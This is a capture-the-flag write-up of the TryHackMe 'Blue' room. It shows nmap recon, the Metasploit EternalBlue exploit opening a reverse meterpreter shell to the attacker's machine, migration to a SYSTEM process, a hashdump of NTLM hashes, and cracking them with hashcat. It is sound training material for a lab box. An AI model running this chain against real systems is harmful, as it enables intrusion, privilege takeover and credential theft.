![](https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif)

This is my writeup for the Try_Hack_Me box - Blue.
The box has Eternal Blue vulnerability. It is an easy box.
Has following sequels as Ice and Blaster. 
 
> Pratyush Prakhar (Sh1nch@n010) - 10/30/2020

# RECON

1. Scan the machine.

2. How many ports are open with a port number under 1000? - **3**

	1. Ran a quick scan for the required port range (0-1000) 

	**nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**

	**Output**
	`````
	Nmap scan report for 10.10.130.42
	Host is up, received reset ttl 125 (0.19s latency).
	Scanned at 2020-10-29 01:39:50 EDT for 4s
	Not shown: 998 closed ports
	Reason: 998 resets
	PORT    STATE SERVICE      REASON
	135/tcp open  msrpc        syn-ack ttl 125
	139/tcp open  netbios-ssn  syn-ack ttl 125
	445/tcp open  microsoft-ds syn-ack ttl 125
	`````

    2. Then ran a standard scan - Default services and scripts on the determined specific ports**(135,139,445)**

    **nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**

    **Output**
	`````
	Nmap scan report for 10.10.130.42
	Host is up, received reset ttl 125 (0.16s latency).
	Scanned at 2020-10-29 01:51:13 EDT for 13s
	PORT    STATE SERVICE      REASON          VERSION
	135/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
	139/tcp open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	`````

3.  What is this machine vulnerable to? - **ms17-010**

	1. Ran a nmap scan for finding the known vulnerabilities

	**nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42**

    **Output**
	`````
	Host script results:
	|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
	|_smb-vuln-ms10-054: false
	|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
	| smb-vuln-ms17-010: 
	|   VULNERABLE:
	|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
	|     State: VULNERABLE
	|     IDs:  CVE:CVE-2017-0143
	|     Risk factor: HIGH
	|       A critical remote code execution vulnerability exists in Microsoft SMBv1
	|        servers (ms17-010).
	|           
	|     Disclosure date: 2017-03-14
	|     References:
	|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
	|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
	`````


# GAIN ACCESS

1. Start Metasploit

2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue**

	We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios.

**Output**
`````
msf5 > search ms17-010

Matching Modules
================

#  Name                                      Disclosure Date  Rank     Check  Description
-  ----                                      ---------------  ----     -----  -----------
0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
`````

3. Show options and set the one required value. What is the name of this value? - **RHOSTS**

	_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_.
	We set RHOST to $BOX_IP and run the exoplit. I also set my _LPORT_ to 9999.

**OUTPUT**
`````
msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
RHOSTS                        **yes**       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT          445              yes       The target port (TCP)
SMBDomain      .                no        (Optional) The Windows domain to use for authentication
`````

4. Run the exploit! - **SUCCESS**

**OUTPUT**
`````
[*] Started reverse TCP handler on 10.2.44.183:9999
[*] 10.10.190.61:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.190.61:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.190.61:445      - Scanned 1 of 1 hosts (100% complete)    
[*] 10.10.190.61:445 - Connecting to target for exploitation.
[+] 10.10.190.61:445 - Connection established for exploitation.
[+] 10.10.190.61:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.190.61:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.190.61:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.190.61:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.190.61:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.190.61:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.190.61:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.190.61:445 - Sending all but last fragment of exploit packet
[*] 10.10.190.61:445 - Starting non-paged pool grooming
[+] 10.10.190.61:445 - Sending SMBv2 buffers
[+] 10.10.190.61:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
*] 10.10.190.61:445 - Sending final SMBv2 buffers.
[*] 10.10.190.61:445 - Sending last fragment of exploit packet!
[*] 10.10.190.61:445 - Receiving response from exploit packet
[+] 10.10.190.61:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.190.61:445 - Sending egg to corrupted connection.
[*] 10.10.190.61:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.190.61
[*] Meterpreter session 1 opened (10.2.44.183:9999 -> 10.10.190.61:49169) at 2020-10-31 03:08:45 -0400
[+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
`````

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z)

`````
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

Id  Name  Type                     Information                   Connection
--  ----  ----                     -----------                   ----------
1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.2.44.183:9999 -> 10.10.190.61:49169 (10.10.190.61)

`````


# ESCLATE

1. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - **post/multi/manage/shell_to_       	meterpreter**

`````
msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

#  Name                                    Disclosure Date  Rank    Check  Description
-  ----                                    ---------------  ----    -----  -----------
0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
`````

2. Select this (use MODULE_PATH). Show options, what option are we required to change? - **SESSION**

`````
msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set session 1

`````

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. - **SUCCESS**

`````
meterpreter > shell
Process 2212 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
`````

7. List all of the processes running via the 'ps' command. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id. - **2828**

`````
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 .....
 2516  696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2584  696   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2708  696   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
 2756  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2828  696   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
`````

8. Migrate to this process. - **SUCCESS**

`````
meterpreter > migrate 2828
[*] Migrating from 2756 to 2828...
[*] Migration completed successfully.
`````

# CRACKING

1. Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? - **Jon**

`````
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0894c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
`````

2. What is the cracked password?

	The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
	**hashcat -m 1000 -a 3 hashes /opt/rockyou.txt**. The NTLM hashes are stored in hashes file. dictiory used is rockyou.txt.

**Cracked Output**
`````
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
`````

# FLAGS

1. Flag1? - **Stroed in C:\ dir**

`````
c:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
`````

2. Flag2? - **All local user account passwords are stored inside windows in C:\windows\system32\config\SAM dir**

````
c:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
`````

3. Flag3? -  **In Jon's home dir**

`````
 c:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
`````
